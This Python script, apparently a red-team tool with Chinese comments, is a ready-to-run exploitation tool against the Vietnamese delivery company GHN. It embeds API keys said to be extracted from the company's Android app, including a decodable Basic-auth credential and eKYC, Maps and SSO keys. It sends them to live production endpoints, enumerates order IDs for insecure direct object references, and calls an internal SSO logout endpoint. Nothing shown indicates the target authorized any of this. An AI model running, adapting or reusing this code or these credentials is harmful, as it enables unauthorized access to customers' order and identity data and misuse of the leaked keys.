#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
GHN API 自动化利用工具
用途: 利用泄露的API密钥进行未授权访问测试
作者: Red Team
日期: 2025-10-24
"""

import requests
import json
import base64
from typing import Dict, List, Optional
import argparse
from datetime import datetime

class GHNExploit:
    """GHN API利用类"""
    
    def __init__(self):
        # 从BuildConfig中提取的硬编码密钥
        self.ANALYTICS_API_KEY = "Y3VzdG9tZXI6cVFRRVBjaDhkaUJMbDFWR25KeGs2NlRuUVlqaFJMWjE="
        self.FPT_EKYC_API_KEY = "xeV5x63Aj33jl9JmKPhrNsD8xzcqA5UV"
        self.APPSFLYER_DEV_KEY = "qrTQMv2AyzpzKJCwYEZuvX"
        self.GOOGLE_MAPS_API_KEY = "AIzaSyBGtfiDL1GF7QvqIqYb-gWAPDZeYEn8X_Y"
        self.SSO_APP_KEY = "d6a4ae02-b16b-4eca-bea8-ab4c0fbf55b6"
        
        # API端点
        self.MAIN_GATEWAY = "https://fe-online-gateway.ghn.vn"
        self.FCM_GATEWAY = "https://online-gateway.ghn.vn/shiip-nodejs/v2"
        self.TRACKING_URL = "https://tracking.ghn.vn"
        self.COD_URL = "https://khachhang.ghn.vn"
        self.SSO_URL = "https://sso.ghn.vn"
        self.TEST_API = "https://test-api.tracking.ghn.tech"
        
        # 解码Analytics凭证
        self.analytics_creds = base64.b64decode(self.ANALYTICS_API_KEY).decode('utf-8')
        print(f"[+] Analytics凭证: {self.analytics_creds}")
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'GHN/4.10.6 (Android 13; Build 191)',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })
    
    def test_analytics_api(self) -> Dict:
        """测试Analytics API访问"""
        print("\n[*] 测试Analytics API...")
        
        headers = {
            'Authorization': f'Basic {self.ANALYTICS_API_KEY}'
        }
        
        try:
            response = self.session.get(
                f"{self.FCM_GATEWAY}/orders/stats",
                headers=headers,
                timeout=10
            )
            
            print(f"[+] 状态码: {response.status_code}")
            print(f"[+] 响应: {response.text[:500]}")
            
            return {
                'success': response.status_code == 200,
                'status_code': response.status_code,
                'response': response.text
            }
        except Exception as e:
            print(f"[-] 错误: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def test_tracking_api(self, tracking_code: str) -> Dict:
        """测试物流跟踪API"""
        print(f"\n[*] 测试跟踪API: {tracking_code}")
        
        try:
            response = self.session.get(
                f"{self.TRACKING_URL}/api/v1/tracking/{tracking_code}",
                timeout=10
            )
            
            print(f"[+] 状态码: {response.status_code}")
            if response.status_code == 200:
                data = response.json()
                print(f"[+] 跟踪数据: {json.dumps(data, indent=2, ensure_ascii=False)}")
                return {'success': True, 'data': data}
            else:
                print(f"[-] 跟踪失败: {response.text}")
                return {'success': False}
                
        except Exception as e:
            print(f"[-] 错误: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def enumerate_orders(self, start_id: int = 1, count: int = 100) -> List[Dict]:
        """枚举订单信息（IDOR测试）"""
        print(f"\n[*] 枚举订单 {start_id} 到 {start_id + count}...")
        
        headers = {
            'Authorization': f'Basic {self.ANALYTICS_API_KEY}'
        }
        
        found_orders = []
        
        for order_id in range(start_id, start_id + count):
            try:
                response = self.session.get(
                    f"{self.FCM_GATEWAY}/orders/{order_id}",
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code == 200:
                    print(f"[+] 发现订单: {order_id}")
                    found_orders.append({
                        'order_id': order_id,
                        'data': response.json()
                    })
                elif response.status_code == 404:
                    print(f"[-] 订单不存在: {order_id}")
                else:
                    print(f"[!] 订单 {order_id} 返回: {response.status_code}")
                    
            except Exception as e:
                print(f"[-] 错误 {order_id}: {str(e)}")
                continue
        
        print(f"\n[+] 共发现 {len(found_orders)} 个可访问订单")
        return found_orders
    
    def test_fpt_ekyc(self, image_path: Optional[str] = None) -> Dict:
        """测试FPT eKYC API"""
        print("\n[*] 测试FPT eKYC API...")
        
        headers = {
            'api-key': self.FPT_EKYC_API_KEY,
            'Content-Type': 'application/json'
        }
        
        # 测试API是否可访问
        try:
            response = self.session.get(
                "https://ekyc.fpt.ai/api/v1/health",
                headers=headers,
                timeout=10
            )
            
            print(f"[+] eKYC API状态码: {response.status_code}")
            print(f"[+] 响应: {response.text}")
            
            return {
                'success': response.status_code == 200,
                'response': response.text
            }
        except Exception as e:
            print(f"[-] 错误: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def test_sso_logout(self) -> Dict:
        """测试SSO登出（使用硬编码app_key）"""
        print("\n[*] 测试SSO登出接口...")
        
        try:
            url = f"https://sso-v2.ghn.vn/internal/logout?app_key={self.SSO_APP_KEY}"
            response = self.session.get(url, timeout=10)
            
            print(f"[+] 状态码: {response.status_code}")
            print(f"[+] 响应: {response.text}")
            
            return {
                'success': response.status_code in [200, 302],
                'response': response.text
            }
        except Exception as e:
            print(f"[-] 错误: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def test_google_maps_api(self) -> Dict:
        """测试Google Maps API密钥"""
        print("\n[*] 测试Google Maps API...")
        
        try:
            response = self.session.get(
                f"https://maps.googleapis.com/maps/api/geocode/json?address=Hanoi&key={self.GOOGLE_MAPS_API_KEY}",
                timeout=10
            )
            
            print(f"[+] 状态码: {response.status_code}")
            if response.status_code == 200:
                data = response.json()
                print(f"[+] API有效！结果: {data.get('status')}")
                return {'success': True, 'data': data}
            else:
                print(f"[-] API无效: {response.text}")
                return {'success': False}
                
        except Exception as e:
            print(f"[-] 错误: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def exploit_all(self):
        """执行所有exploit测试"""
        print("=" * 60)
        print("GHN API 自动化利用工具")
        print("=" * 60)
        print(f"开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
        
        results = {}
        
        # 1. 测试Analytics API
        results['analytics'] = self.test_analytics_api()
        
        # 2. 测试跟踪API
        results['tracking'] = self.test_tracking_api("GHN123456789")
        
        # 3. 测试FPT eKYC
        results['ekyc'] = self.test_fpt_ekyc()
        
        # 4. 测试SSO
        results['sso'] = self.test_sso_logout()
        
        # 5. 测试Google Maps
        results['google_maps'] = self.test_google_maps_api()
        
        # 6. IDOR测试（可选，需要较长时间）
        # results['idor'] = self.enumerate_orders(start_id=1, count=10)
        
        print("\n" + "=" * 60)
        print("测试完成！")
        print("=" * 60)
        
        # 生成报告
        self.generate_report(results)
        
        return results
    
    def generate_report(self, results: Dict):
        """生成测试报告"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'target': 'GHN App',
            'version': '4.10.6',
            'results': results,
            'summary': {
                'total_tests': len(results),
                'successful': sum(1 for r in results.values() if r.get('success', False)),
                'failed': sum(1 for r in results.values() if not r.get('success', False))
            }
        }
        
        # 保存到文件
        filename = f"ghn_exploit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 报告已保存至: {filename}")
        
        # 打印摘要
        print("\n[测试摘要]")
        print(f"总测试数: {report['summary']['total_tests']}")
        print(f"成功: {report['summary']['successful']}")
        print(f"失败: {report['summary']['failed']}")

def main():
    parser = argparse.ArgumentParser(description='GHN API Exploitation Tool')
    parser.add_argument('--mode', choices=['all', 'analytics', 'tracking', 'idor', 'ekyc', 'sso', 'maps'],
                       default='all', help='Exploitation mode')
    parser.add_argument('--tracking-code', help='Tracking code for testing')
    parser.add_argument('--order-start', type=int, default=1, help='IDOR start order ID')
    parser.add_argument('--order-count', type=int, default=10, help='IDOR order count')
    
    args = parser.parse_args()
    
    exploit = GHNExploit()
    
    if args.mode == 'all':
        exploit.exploit_all()
    elif args.mode == 'analytics':
        exploit.test_analytics_api()
    elif args.mode == 'tracking':
        exploit.test_tracking_api(args.tracking_code or "GHN123456789")
    elif args.mode == 'idor':
        exploit.enumerate_orders(args.order_start, args.order_count)
    elif args.mode == 'ekyc':
        exploit.test_fpt_ekyc()
    elif args.mode == 'sso':
        exploit.test_sso_logout()
    elif args.mode == 'maps':
        exploit.test_google_maps_api()

if __name__ == "__main__":
    main()
